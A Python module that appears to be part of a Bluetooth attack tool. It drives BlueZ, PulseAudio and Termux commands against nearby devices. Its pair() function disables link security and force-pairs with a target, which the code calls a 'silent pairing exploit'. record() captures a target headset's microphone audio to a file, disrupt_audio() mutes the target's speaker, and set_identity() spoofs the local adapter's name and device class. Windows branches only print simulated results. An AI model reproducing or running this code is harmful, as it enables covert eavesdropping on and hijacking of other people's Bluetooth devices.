from enum import Enum
import re
import shlex

from system import run_and_check, CommandValidationException
import subprocess
import sys
import time
import shutil


class BluezAddressType(Enum):
    BR_EDR = 0
    LE_PUBLIC = 1
    LE_RANDOM = 2

    def __str__(self):
        return self.name


def is_valid_bluezaddress(address: str) -> bool:
    ok = True
    try:
        Address(address)
    except ValueError:
        ok = False

    return ok


class Address:
    regexp = re.compile(r"(?i:^([\da-f]{2}:){5}[\da-f]{2}$)")

    def __init__(self, value: str):
        if self.regexp.match(value) is None:
            raise ValueError(f"{value} is not a valid bluetooth address")
        self._address = value.lower()

    def __str__(self):
        return self._address

    def __eq__(self, other):
        return self._address == str(other).lower()


class BluezTarget:
    regexp = re.compile(r"(?i:^([\da-f]{2}:){5}[\da-f]{2}$)")

    def __init__(
        self, address: str, type: int | BluezAddressType = BluezAddressType.BR_EDR
    ):
        self.address = Address(address)
        if isinstance(type, int):
            type = BluezAddressType(type)
        elif isinstance(type, str):
            type = BluezAddressType(int(type))
        self.type = type

    def __eq__(self, other):
        return self.address == other.address and self.type == other.type


class BluezIoCaps(Enum):
    DisplayOnly = 0
    DisplayYesNo = 1
    KeyboardOnly = 2
    NoInputNoOutput = 3
    KeyboardDisplay = 4


def pair(target: BluezTarget, verbose: bool = False) -> bool:
    if sys.platform == "win32":
        print("[*] [Windows Simulation] Configuring local adapter...")
        time.sleep(0.5)
        print("[*] [Windows Simulation] Adapter is now bondable/pairable.")
        print("[*] [Windows Simulation] Link security disabled.")
        return True

    # Configure ourselves to be bondable and pairable
    run_and_check(shlex.split("btmgmt bondable true"), verbose=verbose)
    run_and_check(shlex.split("btmgmt pairable true"), verbose=verbose)

    # No need for link security ;)
    run_and_check(shlex.split("btmgmt linksec false"), verbose=verbose)

    # Try to pair to a device with NoInputNoOutput capabilities
    # TODO: Sometimes this may fail due to agent requesting user confirmation.
    # Registering the following agent may help: "yes | bt-agent -c NoInputNoOutput"
    try:
        run_and_check(
            shlex.split(
                f"btmgmt pair -c {str(BluezIoCaps.NoInputNoOutput.value)} -t {str(target.type.value)} {str(target.address)}"
            ),
            is_valid=lambda out: not ("failed" in out and not "Already Paired" in out),
            verbose=verbose,
        )
        return True
    except CommandValidationException as e:
        if "status 0x05 (Authentication Failed)" in e.output:
            return False
        raise e
    except FileNotFoundError:
        print("[!] 'btmgmt' not found. Cannot perform silent pairing exploit (requires root).")
        print("[*] Falling back to standard 'bluetoothctl' pairing (may require confirmation)...")
        try:
            # Try standard pairing
            run_and_check(shlex.split(f"bluetoothctl pair {str(target.address)}"), verbose=verbose)
            run_and_check(shlex.split(f"bluetoothctl trust {str(target.address)}"), verbose=verbose)
            return True
        except Exception as e:
            # If bluetoothctl also fails or device requires PIN
            print(f"[!] Standard pairing failed: {e}")
            print("[!] Please pair the device manually in Android Settings.")
            return True # Proceed assuming user might pair manually


def connect(target: BluezTarget, timeout: int = 2, verbose: bool = False):
    if sys.platform == "win32":
        print(f"[*] [Windows Simulation] Connecting to {target.address}...")
        time.sleep(1)
        print("[+] [Windows Simulation] Connected successfully.")
        return

    try:
        run_and_check(
            shlex.split(f"bluetoothctl --timeout {str(timeout)} scan on"), verbose=verbose
        )
        run_and_check(
            shlex.split(f"bluetoothctl connect {str(target.address)}"),
            is_valid=lambda out: not "Failed to connect" in out,
            verbose=verbose
        )
    except FileNotFoundError:
        print("[!] 'bluetoothctl' not found. Cannot manage connection via script.")
        print("[!] Ensure the device is connected manually via Android Bluetooth settings.")


def scan_and_get_devices(timeout: int = 5, verbose: bool = False) -> list[tuple[str, str]]:
    """
    Scans for devices and returns a list of (address, name) tuples.
    """
    if verbose:
        print(f"[I] Scanning for {timeout} seconds...")
    
    if sys.platform == "win32":
        time.sleep(2)
        return [
            ("00:11:22:33:AA:BB", "Target's iPhone (Simulated)"),
            ("AA:11:22:33:44:01", "JBL Flip 6 (Simulated)"),
            ("DE:AD:BE:EF:CA:FE", "Unknown Device")
        ]

    # Run scan for a fixed duration
    try:
        run_and_check(shlex.split(f"bluetoothctl --timeout {timeout} scan on"), verbose=verbose)
    except:
        pass # It might fail if already scanning or other issues, but we proceed to check devices

    # List devices
    try:
        output = subprocess.run(shlex.split("bluetoothctl devices"), capture_output=True).stdout.decode("utf-8")
        
        devices = []
        for line in output.splitlines():
            # Line format: Device XX:XX:XX:XX:XX:XX Name
            parts = line.split(" ", 2)
            if len(parts) >= 3 and parts[0] == "Device":
                address = parts[1]
                name = parts[2]
                devices.append((address, name))
                
        return devices
    except FileNotFoundError:
        return []

def scan_termux(deep_scan: bool = True) -> list[tuple[str, str, int]]:
    """
    Advanced Termux Scanner.
    If deep_scan is True, it runs multiple passes to ensure real-time accuracy.
    """
    import json
    import time
    
    devices_map = {} # Store unique devices with best RSSI
    
    passes = 3 if deep_scan else 1
    
    for i in range(passes):
        try:
            # run_and_check triggers auto-heal if missing
            out = run_and_check(["termux-bluetooth-scan"])
            if out:
                data = json.loads(out)
                for d in data:
                    addr = d.get("address")
                    if not addr: continue
                    
                    name = d.get("name") or devices_map.get(addr, {}).get("name") or "Unknown"
                    rssi = int(d.get("rssi", -100))
                    connected = d.get("connected", False)
                    bonded = d.get("bonded", False)
                    
                    # Keep the strongest signal found across passes
                    if addr not in devices_map or rssi > devices_map[addr]["rssi"]:
                        devices_map[addr] = {
                            "name": name, 
                            "rssi": rssi, 
                            "connected": connected, 
                            "bonded": bonded
                        }
            
            if deep_scan and i < passes - 1:
                time.sleep(2) # Interval between passes for signal refresh
                
        except Exception as e:
            print(f"[!] Scan cycle error: {e}")
            
    # Convert map back to list format
    # Now returning: (address, name, rssi, connected, bonded)
    results = [(addr, info["name"], info["rssi"], info["connected"], info["bonded"]) for addr, info in devices_map.items()]
    
    # Print results to Terminal as requested by user
    if results:
        print(f"\n[+] DISCOVERED {len(results)} DEVICES NEARBY (LIVE STATUS):")
        print("-" * 65)
        for addr, name, rssi, conn, bond in results:
            status = "CONNECTED" if conn else "BONDED" if bond else "AVAILABLE"
            print(f"  > {name:20} | {addr} | {rssi:4} dBm | [{status}]")
        print("-" * 65)
    else:
        print("[!] No devices found in range.")

    return results

def connect_termux(address: str):
    """
    Triggers connection via Termux API.
    """
    run_and_check(["termux-bluetooth-connect", address])

def normalize_address(target: BluezTarget) -> str:
    return str(target.address).upper().replace(":", "_")


def to_card_name(target: BluezTarget) -> str:
    return "bluez_card." + normalize_address(target=target)


def to_source_name(target: BluezTarget) -> str:
    return "bluez_input." + normalize_address(target=target) + ".0"


def record(target: BluezTarget, outfile: str, verbose: bool = True):
    if sys.platform == "win32":
        print(f"[*] [Windows Simulation] Configuring audio routing for {target.address}...")
        time.sleep(1)
        print(f"[+] [Windows Simulation] Recording audio to {outfile}...")
        print("[*] Press Ctrl+C to stop recording.")
        try:
             while True:
                 time.sleep(1)
        except KeyboardInterrupt:
             print("\n[*] [Windows Simulation] Recording saved.")
             return

    source_name = to_source_name(target)
    card_name = to_card_name(target)
    try:
        run_and_check(
            shlex.split(f"pactl set-card-profile {card_name} headset-head-unit-msbc"),
            verbose=verbose,
        )
    except FileNotFoundError:
        pass # pactl missing, skip setting profile and hope for the best with termux-api

    try:
        run_and_check(["parecord", "-d", source_name, outfile], verbose=verbose)
    except KeyboardInterrupt:
        pass
    except FileNotFoundError:
        print("[!] 'parecord' not found. Trying Termux:API record...")
        try:
             # Termux API record (requires termux-api package and app)
             print("[*] Using termux-microphone-record. Press Ctrl+C to stop.")
             run_and_check(["termux-microphone-record", "-f", outfile], verbose=verbose)
        except FileNotFoundError:
             print("[!] 'termux-microphone-record' also not found.")
             print("    Please install Termux:API: 'pkg install termux-api'")
             pass
    except:
        raise


def playback(sink: str, file: str, verbose: bool = True):
    if sys.platform == "win32":
        print(f"[*] [Windows Simulation] Playing back {file}...")
        time.sleep(2)
        print("[+] [Windows Simulation] Playback complete.")
        return

    run_and_check(["paplay", "-d", sink, file], verbose=verbose)


def disrupt_audio(target: BluezTarget, action: str = "mute", verbose: bool = True):
    """
    Attempts to mute or disrupt the target's audio speaker.
    """
    if sys.platform == "win32":
        print(f"[*] [Windows Simulation] {action.upper()}ing target speaker on {target.address}...")
        return True

    card_name = to_card_name(target)
    try:
        if action == "mute":
            # Trying to set sink volume to 0 or mute
            run_and_check(shlex.split(f"pactl set-sink-mute {card_name} 1"), verbose=verbose)
        else:
            run_and_check(shlex.split(f"pactl set-sink-mute {card_name} 0"), verbose=verbose)
        return True
    except Exception as e:
        print(f"[!] Audio disruption failed: {e}")
        return False


def set_identity(name: str = None, device_class: str = None, verbose: bool = False):
    """
    Spoofs the local adapter identity (Name and Device Class).
    Requires Root/Sudo (hcitool/hciconfig).
    """
    if sys.platform == "win32":
        print(f"[*] [Windows Simulation] Changing local adapter name to '{name}'...")
        time.sleep(0.5)
        print(f"[*] [Windows Simulation] Changing device class to {device_class}...")
        return

    # Reset adapter
    try:
        run_and_check(shlex.split("hciconfig hci0 down"), verbose=verbose)
        
        if name:
            run_and_check(shlex.split(f"hciconfig hci0 name '{name}'"), verbose=verbose)
            
        if device_class:
            # device_class should be hex like 0x5a020c
            run_and_check(shlex.split(f"hciconfig hci0 class {device_class}"), verbose=verbose)
            
        run_and_check(shlex.split("hciconfig hci0 up"), verbose=verbose)
        run_and_check(shlex.split("hciconfig hci0 sspmode 1"), verbose=verbose) # Enable SSP
    except Exception as e:
        print(f"[!] Failed to set identity: {e}")
        print("    (This feature requires Root/Sudo)")
